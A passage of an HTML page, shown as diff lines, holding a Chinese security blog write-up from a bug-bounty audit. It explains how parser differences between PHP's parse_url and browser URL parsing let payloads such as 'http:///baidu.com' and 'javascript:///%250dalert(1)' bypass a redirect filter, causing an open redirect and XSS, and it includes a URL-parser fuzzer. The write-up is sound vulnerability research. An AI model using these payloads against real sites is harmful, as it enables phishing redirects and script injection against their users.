2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    目录
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#source--sink">Source &amp; Sink</a></li>
+    <li><a href="#sanitizerfilter">Sanitizer/Filter</a></li>
+    <li><a href="#绕过host检查">绕过host检查</a></li>
+    <li><a href="#绕过scheme检查">绕过scheme检查</a></li>
+    <li><a href="#进一步的研究">进一步的研究</a>
+      <ul>
+        <li><a href="#httpcharlocalhost80xxxx">http:{char}//localhost:80/xxxx</a></li>
+        <li><a href="#httpcharlocalhost80xxxx-1">http{char}://localhost:80/xxxx</a></li>
+        <li><a href="#charhttplocalhost80xxxx">{char}http://localhost:80/xxxx</a></li>
+        <li><a href="#htchartplocalhost80xxxx">ht{char}tp://localhost:80/xxxx</a></li>
+        <li><a href="#汇总">汇总</a></li>
+      </ul>
+    </li>
+    <li><a href="#根本原因">根本原因</a></li>
+    <li><a href="#总结">总结</a></li>
+    <li><a href="#keep-in-touch">Keep in touch</a></li>
+    <li><a href="#参考资料">参考资料</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    目录
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#source--sink">Source &amp; Sink</a></li>
+    <li><a href="#sanitizerfilter">Sanitizer/Filter</a></li>
+    <li><a href="#绕过host检查">绕过host检查</a></li>
+    <li><a href="#绕过scheme检查">绕过scheme检查</a></li>
+    <li><a href="#进一步的研究">进一步的研究</a>
+      <ul>
+        <li><a href="#httpcharlocalhost80xxxx">http:{char}//localhost:80/xxxx</a></li>
+        <li><a href="#httpcharlocalhost80xxxx-1">http{char}://localhost:80/xxxx</a></li>
+        <li><a href="#charhttplocalhost80xxxx">{char}http://localhost:80/xxxx</a></li>
+        <li><a href="#htchartplocalhost80xxxx">ht{char}tp://localhost:80/xxxx</a></li>
+        <li><a href="#汇总">汇总</a></li>
+      </ul>
+    </li>
+    <li><a href="#根本原因">根本原因</a></li>
+    <li><a href="#总结">总结</a></li>
+    <li><a href="#keep-in-touch">Keep in touch</a></li>
+    <li><a href="#参考资料">参考资料</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>2022年8月份在挖天融信SRC的时候，发现天融信的某个站点使用了redacted系统，于是便在github上下载了redacted的源码，审计了一下。</p>
+
+
+<h2 class="relative group">Source &amp; Sink 
+    <div id="source--sink" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#source--sink" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>通过审计发现，redacted系统在多处使用goto 参数来实现页面的重定向，比如说登录功能:</p>
+<pre tabindex="0"><code>http://demo.redacted.com/login?goto=/
+</code></pre><p>已经登录的用户如果访问该URL，后端将会读取goto参数的值，将其填充到twig模板中的div标签的自定义属性<code>data-goto</code>中:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">{% block content %}
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;page-message-container&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-message-container&#34;</span> <span class="na">data-goto</span><span class="o">=</span><span class="s">&#34;{{ goto }}&#34;</span> <span class="na">data-duration</span><span class="o">=</span><span class="s">{{</span> <span class="na">duration</span> <span class="err">}}</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-message-panel&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-message-heading&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-message-title&#34;</span><span class="p">&gt;</span>{{ title|trans }}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-message-body&#34;</span><span class="p">&gt;</span>{{ message|default(&#39;&#39;)|trans|raw }}<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">{% endblock %}
+</span></span></code></pre></div><p>之后前端通过如下js代码读取data-goto属性的值，通过<code>window.location.href</code>实现页面的跳转:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#page-message-container&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">r</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nx">data</span><span class="p">(</span><span class="s2">&#34;goto&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">o</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nx">data</span><span class="p">(</span><span class="s2">&#34;duration&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">o</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">r</span> <span class="o">&amp;&amp;</span> <span class="nx">setTimeout</span><span class="p">((</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">r</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}),</span> <span class="nx">o</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span></code></pre></div>
+
+<h2 class="relative group">Sanitizer/Filter 
+    <div id="sanitizerfilter" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#sanitizerfilter" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>redacted为了防止在页面重定向的过程中出现开放重定向漏洞（OR）和XSS ，专门在后端写了一个过滤器，对goto参数中的URL进行过滤:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * 过滤URL.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     *
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * 如果url不属于非本站域名下的，则返回本站首页地址。
+</span></span></span><span class="line"><span class="cl"><span class="sd">     *
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @param $url string 待过滤的$url
+</span></span></span><span class="line"><span class="cl"><span class="sd">     *
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @return string
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">filterRedirectUrl</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;request_stack&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">getCurrentRequest</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getHost</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$safeHosts</span> <span class="o">=</span> <span class="p">[</span><span class="nv">$host</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$parsedUrl</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$isUnsafeHost</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">],</span> <span class="nv">$safeHosts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$isInvalidUrl</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$isUnsafeHost</span> <span class="o">||</span> <span class="nv">$isInvalidUrl</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">generateUrl</span><span class="p">(</span><span class="s1">&#39;homepage&#39;</span><span class="p">,</span> <span class="p">[],</span> <span class="nx">UrlGeneratorInterface</span><span class="o">::</span><span class="na">ABSOLUTE_URL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">strip_tags</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>该 filter 的工作机制大致如下：</p>
+<ol>
+<li>拿到http请求报文中Host请求头，作为host白名单</li>
+<li>设置协议白名单: http,https</li>
+<li>使用PHP的URL解析器，来解析传入的URL，得到host部分和scheme部分</li>
+<li>如果host部分和scheme部分存在，就判断host部分是否属于host白名单，scheme部分是否属于scheme白名单</li>
+<li>否则就认为用户传入的是一个相对URL</li>
+</ol>
+
+
+<h2 class="relative group">绕过host检查 
+    <div id="%E7%BB%95%E8%BF%87host%E6%A3%80%E6%9F%A5" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E7%BB%95%E8%BF%87host%E6%A3%80%E6%9F%A5" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>如何绕过filter的host检查呢？
+我想到了之前用来绕过 SSRF filter 的一个payload ：</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=http://baidu.com\@demo.redacted.com/
+</code></pre><p>这段payload 之所以可以成功，主要是利用了前后端URL解析器的不一致性：</p>
+<ul>
+<li>PHP的<code>parse_url</code>认为URL的host部分是demo.redacted.com ，与http请求报文中Host请求一致，所以通过了检查,</li>
+<li>但是js的URL解析器却并不这样认为: js 的URL解析器会将 \ 规范化为 / ，所以原来的payload 经过解析后就变成了:</li>
+</ul>
+<pre tabindex="0"><code>http://baidu.com/@demo.redacted.com/
+</code></pre><p>因此前端认为URL的host部分是baidu.com 。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http://baidu.com\\@demo.redacted.com/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span><span class="nx">origin</span><span class="o">:</span> <span class="s1">&#39;http://baidu.com&#39;</span><span class="p">,</span> <span class="nx">protocol</span><span class="o">:</span> <span class="s1">&#39;http:&#39;</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;baidu.com&#39;</span><span class="p">,</span> <span class="err">…</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">hash</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">href</span><span class="o">:</span> <span class="s2">&#34;http://baidu.com/@demo.redacted.com/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">origin</span><span class="o">:</span> <span class="s2">&#34;http://baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">password</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">pathname</span><span class="o">:</span> <span class="s2">&#34;/@demo.redacted.com/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">port</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http:&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">search</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">searchParams</span><span class="o">:</span> <span class="nx">URLSearchParams</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span></code></pre></div>
+
+<h2 class="relative group">绕过scheme检查 
+    <div id="%E7%BB%95%E8%BF%87scheme%E6%A3%80%E6%9F%A5" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E7%BB%95%E8%BF%87scheme%E6%A3%80%E6%9F%A5" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>仅仅绕过host检查，我们只能造成一个开放重定向漏洞，想要造成xss，还需要绕过后端的协议检查，如何绕过后端的协议检查呢？</p>
+<p>我们可以尝试从如下思路来切入：因为漏洞的出现往往是由于程序的一些错误假设，所以我们可以尝试去寻找一下filter 有哪些错误的假设，然后尝试去打破它。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$parsedUrl</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$isUnsafeHost</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">],</span> <span class="nv">$safeHosts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$isInvalidUrl</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$parsedUrl</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$isUnsafeHost</span> <span class="o">||</span> <span class="nv">$isInvalidUrl</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">generateUrl</span><span class="p">(</span><span class="s1">&#39;homepage&#39;</span><span class="p">,</span> <span class="p">[],</span> <span class="nx">UrlGeneratorInterface</span><span class="o">::</span><span class="na">ABSOLUTE_URL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">strip_tags</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span></code></pre></div><p>再次回看上面的那段filter代码，filter 假设：</p>
+<ol>
+<li>如果从URL中解析不到 host 和 scheme 部分，就一定是相对URL</li>
+<li>&ldquo;相对URL&quot;一定就是安全的。</li>
+</ol>
+<p>那么如果我们让parse_url返回false会怎么样？</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">false</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="k">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="k">false</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="k">NULL</span> 
+</span></span></code></pre></div><p>parse_url 会认为用户传入的URL没有host和scheme部分，所以是一个相对URL!而相对URL一定是安全的，可以直接返回给前端。</p>
+<p>如何让parse_url返回false呢？</p>
+<p>PHP URL parser 只是对RFC标准的实现，所以一旦传入的URL不符合RFC规范，那么parse_url就会返回false</p>
+<p>比如一个经典的payload ，便可以用一种更简单的方式造成开放重定向:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=http:///baidu.com 
+</code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc1738" target="_blank">RFC 1738</a> 规定:层级结构的绝对URL 除去协议部分，后续部分必须以 // 开头</p>
+<blockquote>
+<p>The scheme specific data start with a double slash &ldquo;//&rdquo; to indicate that it complies with the common Internet scheme syntax.</p>
+</blockquote>
+<p>所以PHP 的URL解析器认为 http:///baidu.com 是一个非法的URL，因此直接返回了false，所以直接跳过了后续检查，返回给了前端。</p>
+<p>但是前端的URL解析器并不这么认为,它会将http:///baidu.com 规范化为http://baidu.com :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http:///baidu.com&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span><span class="nx">origin</span><span class="o">:</span> <span class="s1">&#39;http://baidu.com&#39;</span><span class="p">,</span> <span class="nx">protocol</span><span class="o">:</span> <span class="s1">&#39;http:&#39;</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;baidu.com&#39;</span><span class="p">,</span> <span class="err">…</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">hash</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">href</span><span class="o">:</span> <span class="s2">&#34;http://baidu.com/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">origin</span><span class="o">:</span> <span class="s2">&#34;http://baidu.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">password</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">pathname</span><span class="o">:</span> <span class="s2">&#34;/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">port</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http:&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">search</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">searchParams</span><span class="o">:</span> <span class="nx">URLSearchParams</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span></code></pre></div><p>所以造成了OR 漏洞。</p>
+<p>那么如果将http协议换成javascript 协议呢？RFC文档只是规定了层级URL必须包含<code>//</code>前缀，却没有明确说明: 如果非层级URL包含<code>//</code> 前缀，URL解析器应该如何处理。</p>
+<pre tabindex="0"><code>javascript:alert(1)
+javascript://alert(1)
+mailto:happyhacking@qq.com 
+mailto://happyhacking@qq.com 
+</code></pre><p>于是我便想到了如下payload:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=javascript:///%250dalert(1)
+</code></pre><p>PHP 的URL解析器认为 <code>javascript:///%250dalert(1)</code> 是一个非法URL，直接返回了false，所以filter 跳过了协议检查，直接认为这就是一个安全的”相对URL“ 。</p>
+<p>但是前端的URL解析器有自己的想法：</p>
+<p>这行payload 反射到前端后是这样的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;javascript:///%0dalert(1)&#39;</span>
+</span></span></code></pre></div><p>前端的URL解析器先进行URL解码，将<code>%0d</code>解码为<code>\n</code> ,解析到的协议名为javascript，因此切换为了js 解析器，js 解析器则认为<code>//</code> 是单行注释符，alert(1) 是换行后的下一行js代码。</p>
+<p>因此造成了XSS</p>
+
+
+<h2 class="relative group">进一步的研究 
+    <div id="%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E7%A0%94%E7%A9%B6" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E7%A0%94%E7%A9%B6" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>能不能通过编写fuzzer来进一步搜索到js URL解析器和php URL解析器的更多不一致性呢?</p>
+
+
+<h3 class="relative group">http:{char}//localhost:80/xxxx 
+    <div id="httpcharlocalhost80xxxx" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#httpcharlocalhost80xxxx" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+<p>我们能否在 <code>http:</code> 和 <code>//</code>之间找到一个字符，将该字符填充到{char}位置之后，前端URL解析器仍然认为URL的host部分是localhost呢?</p>
+<p>fuzzer如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">log</span><span class="o">=</span><span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x10ffff</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http:&#39;</span><span class="o">+</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;//localhost:80/xxxx&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;localhost&#39;</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="s1">&#39;:URL encoded i : &#39;</span><span class="o">+</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCodePoint</span><span class="p">(</span><span class="nx">i</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">log</span>
+</span></span></code></pre></div><p>前端URL解析器的运行结果:</p>
+<pre tabindex="0"><code>9:  URL encoded i : %09 debugger eval code:7:13-&gt; \t http:%09//localhost  
